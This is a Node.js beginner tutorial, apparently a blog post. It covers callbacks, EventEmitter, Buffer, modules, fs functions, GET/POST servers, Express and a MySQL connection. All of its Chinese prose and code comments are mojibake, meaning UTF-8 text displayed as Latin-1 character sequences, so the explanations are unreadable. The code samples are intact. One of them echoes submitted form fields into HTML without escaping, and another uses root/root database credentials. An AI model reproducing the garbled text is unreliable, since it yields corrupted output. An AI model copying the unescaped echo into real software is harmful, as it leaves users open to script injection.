<p>å›åˆ°å¼€å¤´çš„å¼•è¨€ æˆ‘ä»¬äº†è§£äº†å›è°ƒå‡½æ•°ä»¥åŠäº‹ä»¶å¾ªç¯ å°±èƒ½æ‰§è¡Œå¼‚æ­¥æ“ä½œäº†<br>ä¸‹é¢æ˜¯ å°†æ‰§è¡Œå¼‚æ­¥æ“ä½œçš„å‡½æ•°å†™åœ¨å›è°ƒå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°ä¸­ å›è°ƒå‡½æ•°æ¥æ”¶é”™è¯¯å¯¹è±¡åˆ™ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>æ‰§è¡Œ 3.js-&gt;åˆ é™¤ input.txt-&gt;æ‰§è¡Œ 3.js</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;ç¨‹åºæ‰§è¡Œå®Œæ¯•&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>readFile å‡½æ•°è¯»å–æ–‡ä»¶ï¼Œå¦‚æœåœ¨è¯»å–æ–‡ä»¶è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œé”™è¯¯ err å¯¹è±¡å°±ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚<br>å¦‚æœæ²¡å‘ç”Ÿé”™è¯¯ï¼ŒreadFile è·³è¿‡ err å¯¹è±¡çš„è¾“å‡ºï¼Œæ–‡ä»¶å†…å®¹å°±é€šè¿‡å›è°ƒå‡½æ•°è¾“å‡ºï¼Œæ­¤æ—¶å°±æ˜¯ä¸€æ¬¡å¼‚æ­¥æ“ä½œã€‚</p>
<h2 id="å…­ã€EventEmitter"><a href="#å…­ã€EventEmitter" class="headerlink" title="å…­ã€EventEmitter"></a>å…­ã€EventEmitter</h2><p>events æ¨¡å—åªæä¾› events.EventEmitter,å®ƒæ˜¯äº‹ä»¶è§¦å‘å’Œäº‹ä»¶ç›‘å¬çš„å°è£… EventEmitter å¯¹è±¡ä¸­æœ‰å¤šä¸ªå±æ€§ on ç»‘å®šäº‹ä»¶å‡½æ•° emit å±æ€§è§¦å‘äº‹ä»¶</p>
<p>event.js EventEmitter ç”¨æ³•</p>
<p>event1.js ä½“ç°å¦‚ä¸‹</p>
<p>EventEmitter çš„æ¯ä¸ªäº‹ä»¶ç”±ä¸€ä¸ªäº‹ä»¶åå’Œè‹¥å¹²ä¸ªå‚æ•°ç»„æˆï¼Œäº‹ä»¶åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸è¡¨è¾¾ä¸€å®šçš„è¯­ä¹‰ã€‚å¯¹äºæ¯ä¸ªäº‹ä»¶ï¼ŒEventEmitter æ”¯æŒ è‹¥å¹²ä¸ªäº‹ä»¶ç›‘å¬å™¨ã€‚</p>
<p>å½“äº‹ä»¶è§¦å‘æ—¶ï¼Œæ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶çš„äº‹ä»¶ç›‘å¬å™¨è¢«ä¾æ¬¡è°ƒç”¨ï¼Œäº‹ä»¶å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°å‚æ•°ä¼ é€’ã€‚</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/EventEmitter.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>event å®ä¾‹.js äº†è§£å…¶ä»–å±æ€§æ–¹æ³•â€¦</p>
<h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>ä¸€ä¸ªäº‹ä»¶å‘ç”Ÿé”™è¯¯æ—¶æ²¡æœ‰ç›‘å¬å™¨æ—¶ä¼šæŠ¥é”™ ä¸€èˆ¬è¦å¯¹å…¶è®¾ç½® error äº‹ä»¶çš„ç›‘å¬å™¨</p>
<h2 id="ä¸ƒã€Buffer"><a href="#ä¸ƒã€Buffer" class="headerlink" title="ä¸ƒã€Buffer"></a>ä¸ƒã€Buffer</h2><p>JavaScript è¯­è¨€è‡ªèº«åªæœ‰å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æ•°æ®ç±»å‹ã€‚</p>
<p>ä½†åœ¨å¤„ç†åƒ TCP æµæˆ–æ–‡ä»¶æµæ—¶ï¼Œå¿…é¡»ä½¿ç”¨åˆ°äºŒè¿›åˆ¶æ•°æ®ã€‚å› æ­¤åœ¨ Node.js ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ª Buffer ç±»ï¼Œè¯¥ç±»ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å­˜åŒºã€‚</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// è¾“å‡º 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// è¾“å‡º cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p>ç›®å‰æ”¯æŒçš„å­—ç¬¦ç¼–ç  asciiã€utf8ã€utf16leã€ucs2 - utf16leã€base64ã€latin1ã€binary - latin1ã€hex</p>
<p>å†™å…¥ç¼“å†²åŒº</p>
<blockquote>
<p>buf.write(string[, offset[, length]][, encoding])</p>
</blockquote>
<p>ä»ç¼“å†²åŒºè¯»å–</p>
<blockquote>
<p>buf.toString([encoding[, start[, end]]])</p>
</blockquote>
<p>å°† buffer è½¬æ¢ä¸º json å¯¹è±¡</p>
<blockquote>
<p>buf.toJSON()</p>
</blockquote>
<p>åˆå¹¶ç¼“å†²åŒº</p>
<blockquote>
<p>Buffer.concat(list[, totalLength])</p>
</blockquote>
<p>æ¯”è¾ƒç¼“å†²åŒº</p>
<blockquote>
<p>buf.compare(otherBuffer);</p>
</blockquote>
<p>æ‹·è´ç¼“å†²åŒº</p>
<blockquote>
<p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p>
</blockquote>
<p>è£å‰ªç¼“å†²åŒº</p>
<blockquote>
<p>buf.slice([start[, end]])</p>
</blockquote>
<p>è®¡ç®—ç¼“å†²åŒºé•¿åº¦</p>
<blockquote>
<p>buf.length;</p>
</blockquote>
<h2 id="å…«ã€æ¨¡å—ç³»ç»Ÿ"><a href="#å…«ã€æ¨¡å—ç³»ç»Ÿ" class="headerlink" title="å…«ã€æ¨¡å—ç³»ç»Ÿ"></a>å…«ã€æ¨¡å—ç³»ç»Ÿ</h2><p>å‰é¢ä»‹ç»è¿‡äº† å¼•å…¥æ¨¡å—ä½¿ç”¨ require+æ¨¡å—æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/require.jpg" srcset="/img/loading.gif" lazyload><br>require æ¥æ”¶ httpã€fs ç­‰åŸç”Ÿæ¨¡å—ä»¥åŠæŸè·¯å¾„ä¸‹çš„æ–‡ä»¶æ¨¡å—ï¼Œè¿˜æœ‰ mod éåŸç”Ÿæ¨¡å—</p>
<p>æ³¨æ„ï¼šrequire()ä¸æ˜¯å…¨å±€çš„ï¼</p>
<h2 id="ä¹ã€å‡½æ•°"><a href="#ä¹ã€å‡½æ•°" class="headerlink" title="ä¹ã€å‡½æ•°"></a>ä¹ã€å‡½æ•°</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>say æ˜¯ä¸€ä¸ªå‡½æ•° execute å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ say æœ¬èº«(ä¸æ˜¯å®ƒçš„è¿”å›å€¼) è€Œ say ä¸­æœ‰ä¸€ä¸ªå‚æ•° æ‰€ä»¥ç”¨æœ¬åœ°å˜é‡ someFunction æ¥ä¼ é€’å˜é‡</p>
<ul>
<li>åŒ¿åå‡½æ•°<br>ä¸€èˆ¬æˆ‘ä»¬å‡½æ•°ä½¿ç”¨æ˜¯å…ˆå£°æ˜åå®šä¹‰ä½¿ç”¨<br>å³ä½¿æˆ‘ä»¬ä¸æ€¥ç€å®šä¹‰å‡½æ•°ä½“ ä½†åœ¨å¯¹åº”åŸŸå‰å¿…é¡»å£°æ˜äº† æˆ‘ä»¬æ‰èƒ½è°ƒç”¨ è€Œè¿™æˆ‘ä»¬å¯åœ¨å‡½æ•°ä½“å†…â€”â€”åœ¨å‚æ•°è¡¨ä¸­ä½¿ç”¨æœ¬åœ°å˜é‡ someFunction åœ¨å‡½æ•°ä½“å†…ç›´æ¥ä½¿ç”¨ ç”šè‡³éƒ½ä¸ç”¨ç»™å‡½æ•°åå­—</li>
</ul>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="åã€è·¯ç”±"><a href="#åã€è·¯ç”±" class="headerlink" title="åã€è·¯ç”±"></a>åã€è·¯ç”±</h2><p>url è¯·æ±‚ GET POST å‚æ•°åœ¨å‰é¢æ­å»ºç®€å•åº”ç”¨æ—¶æ²¡æœ‰æåŠ ä½œä¸ºåç«¯å¤„ç†è¿™äº›è¯·æ±‚å°±è¦æœ‰ç›¸åº”çš„æœåŠ¡å™¨çš„åŠŸèƒ½<br>router ä¸‹æœ‰ä¸ª index.js æ–‡ä»¶ é‡Œé¢å¯ä»¥è®¾ç½®æ•°æ®åº“ å¼•å…¥å…¶ä»–æ¨¡å— åŒæ ·å¯ä»¥å†™ä¸€ä¸ªæœåŠ¡çš„ serve.js å¼•å…¥ http url ç­‰æ¨¡å— å¯åŠ¨åå……å½“æœåŠ¡å™¨<br>ç„¶åç”¨åˆ°ä¸€ä¸ª router.js çš„æ–‡ä»¶ å†™ä¸€ä¸ªè·¯ç”±å‡½æ•°ä½œä¸ºå‚æ•°ä¼ ç»™ server.js<br>è‡³æ­¤å¯ä»¥è®¿é—® url</p>
<h2 id="åä¸€ã€å…¨å±€å˜é‡"><a href="#åä¸€ã€å…¨å±€å˜é‡" class="headerlink" title="åä¸€ã€å…¨å±€å˜é‡"></a>åä¸€ã€å…¨å±€å˜é‡</h2><p>åˆ—å‡ºä¸€ä¸¢ä¸¢ï¼š</p>
<p>_filename å½“å‰è„šæœ¬æ–‡ä»¶å è¾“å‡ºå…¶ç»å¯¹è·¯å¾„</p>
<p>_dirname å½“å‰è„šæœ¬æ‰€åœ¨è·¯å¾„</p>
<p>setTimeout(function(),ms) å…¨å±€å‡½æ•° åœ¨æŒ‡å®šæ¯«ç§’åæ‰§è¡Œä¸€æ¬¡å‡½æ•°</p>
<p>clearTimeout(t) æ¸…é™¤ setTimeout()</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// ä¸¤ç§’åæ‰§è¡Œä»¥ä¸Šå‡½æ•°</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// æ¸…é™¤å®šæ—¶å™¨</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure>

<p>setlnterval(function(),ms)<br>clearlnterval(t)<br>å’Œä¸Šé¢çš„ä¸¤ä¸ªä¸€æ · ä¸åŒçš„æ˜¯ setlntercal ä¼šä¸€ç›´è°ƒç”¨å‡½æ•° ç›´è‡³ clearlnterval è°ƒç”¨æˆ–çª—å£å…³é—­</p>
<p>process æ˜¯ global çš„å±æ€§ ä¹Ÿæ˜¯å…¨å±€å˜é‡æœ‰å››ä¸ªäº‹ä»¶<br>exit before uncaughException Signal</p>
<h2 id="åäºŒã€æ–‡ä»¶-å¼‚æ­¥"><a href="#åäºŒã€æ–‡ä»¶-å¼‚æ­¥" class="headerlink" title="åäºŒã€æ–‡ä»¶-å¼‚æ­¥"></a>åäºŒã€æ–‡ä»¶-å¼‚æ­¥</h2><p>å¯¼å…¥æ–‡ä»¶ç³»ç»Ÿæ¨¡å—<br><code>var fs = require(&quot;fs&quot;)</code></p>
<ul>
<li>è¯»å– input.txt</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;å¼‚æ­¥è¯»å–: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>ç±»ä¼¼åœ°æœ‰å‡½æ•°ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ‰“å¼€<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>å†™å…¥<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>è¯»å–<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>å…³é—­<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>åˆ é™¤<br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>è¿˜æœ‰ç›®å½•...<br></code></pre></td></tr></table></figure>

<h2 id="åä¸‰ã€GET-POST-è¯·æ±‚"><a href="#åä¸‰ã€GET-POST-è¯·æ±‚" class="headerlink" title="åä¸‰ã€GET/POST è¯·æ±‚"></a>åä¸‰ã€GET/POST è¯·æ±‚</h2><p>è·å– get è¯·æ±‚çš„å‚æ•°</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>

<p>è·å– url çš„å‚æ•°</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br><br>    <span class="hljs-comment">// è§£æ url å‚æ•°</span><br>    <span class="hljs-keyword">var</span> params = <span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>).query;<br>    res.write(<span class="hljs-string">&quot;ç½‘ç«™åï¼š&quot;</span> + params.name);<br>    res.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>    res.write(<span class="hljs-string">&quot;ç½‘ç«™ URLï¼š&quot;</span> + params.url);<br>    res.end();<br><br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>

<p>è·å– post çš„å†…å®¹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    <span class="hljs-comment">// å®šä¹‰äº†ä¸€ä¸ªpostå˜é‡ï¼Œç”¨äºæš‚å­˜è¯·æ±‚ä½“çš„ä¿¡æ¯</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// é€šè¿‡reqçš„dataäº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œæ¯å½“æ¥å—åˆ°è¯·æ±‚ä½“çš„æ•°æ®ï¼Œå°±ç´¯åŠ åˆ°postå˜é‡ä¸­</span><br>    req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)</span>&#123;<br>        post += chunk;<br>    &#125;);<br><br>    <span class="hljs-comment">// åœ¨endäº‹ä»¶è§¦å‘åï¼Œé€šè¿‡querystring.parseå°†postè§£æä¸ºçœŸæ­£çš„POSTè¯·æ±‚æ ¼å¼ï¼Œç„¶åå‘å®¢æˆ·ç«¯è¿”å›ã€‚</span><br>    req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        post = querystring.parse(post);<br>        res.end(util.inspect(post));<br>    &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>

<p>æäº¤ post è¡¨å•</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><br><span class="hljs-keyword">var</span> postHTML =<br>  <span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Node.js å®ä¾‹&lt;/title&gt;&lt;/head&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;form method=&quot;post&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;ç½‘ç«™åï¼š &lt;input name=&quot;name&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;ç½‘ç«™ URLï¼š &lt;input name=&quot;url&quot;&gt;&lt;br&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot;&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span> +<br>  <span class="hljs-string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> body = <span class="hljs-string">&quot;&quot;</span>;<br>  req.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>    body += chunk;<br>  &#125;);<br>  req.on(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// è§£æå‚æ•°</span><br>    body = querystring.parse(body);<br>    <span class="hljs-comment">// è®¾ç½®å“åº”å¤´éƒ¨ä¿¡æ¯åŠç¼–ç </span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);<br><br>    <span class="hljs-keyword">if</span>(body.name &amp;&amp; body.url) &#123; <span class="hljs-comment">// è¾“å‡ºæäº¤çš„æ•°æ®</span><br>        res.write(<span class="hljs-string">&quot;ç½‘ç«™åï¼š&quot;</span> + body.name);<br>        res.write(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        res.write(<span class="hljs-string">&quot;ç½‘ç«™ URLï¼š&quot;</span> + body.url);<br>    &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// è¾“å‡ºè¡¨å•</span><br>        res.write(postHTML);<br>    &#125;<br>    res.end();<br>  &#125;);<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure>

<h2 id="åå››ã€Express-æ¡†æ¶"><a href="#åå››ã€Express-æ¡†æ¶" class="headerlink" title="åå››ã€Express æ¡†æ¶"></a>åå››ã€Express æ¡†æ¶</h2><p>åˆ©ç”¨ Express æ¡†æ¶<br>å®ç° GEt æ–¹æ³•æäº¤ä¸¤ä¸ªå‚æ•°å’Œ POST æ–¹æ³•æäº¤ä¸¤ä¸ªå‚æ•°<br>å®Œæˆæ–‡ä»¶ä¸Šä¼  è¦æœ¬åœ°å®‰è£… multer æ¨¡å— åœ¨ç›®å½•ä¸‹èƒ½çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶<br>å¯¹ cookie è¿›è¡Œç®¡ç† è¦æœ¬åœ°å®‰è£… cookie-parser æ¨¡å— åœ¨æœåŠ¡ç»ˆç«¯èƒ½çœ‹åˆ° cookie ä¿¡æ¯</p>
<h2 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h2><p>ä»¥ mysql ä¸ºä¾‹<br>åœ¨ä¸€é¡¹ç›®ä¸­ test.js æ–‡ä»¶æ˜¯ nodejs ä¸ mysql çš„é…ç½®ä¿¡æ¯</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">var mysql      = require(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br>var <span class="hljs-keyword">connection</span> = mysql.createConnection(&#123;<br>  host     : <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-keyword">user</span>     : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">password</span> : <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-keyword">database</span> : <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">connection</span>.<span class="hljs-keyword">connect</span>();<br><br><span class="hljs-keyword">connection</span>.query(<span class="hljs-string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="hljs-keyword">function</span> (error, results, fields) &#123;<br>  <span class="hljs-keyword">if</span> (error) throw error;<br>  console.log(<span class="hljs-string">&#x27;The solution is: &#x27;</span>, results[<span class="hljs-number">0</span>].solution);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>å¦‚æœæˆåŠŸè¿æ¥æ•°æ®åº“çš„è¯ è¾“å‡º 2</p>
<p>å¯ä»¥åœ¨å…¶ä»– js ä¸­æŸ¥è¯¢æ•°æ®åº“çš„ä¿¡æ¯<br>ä»¥æŸ¥ä¸€ä¸ªè¡¨ä¸ºä¾‹ æ•°æ®åº“å¯ä»¥è‡ªè¡Œåˆ›å»º</p>
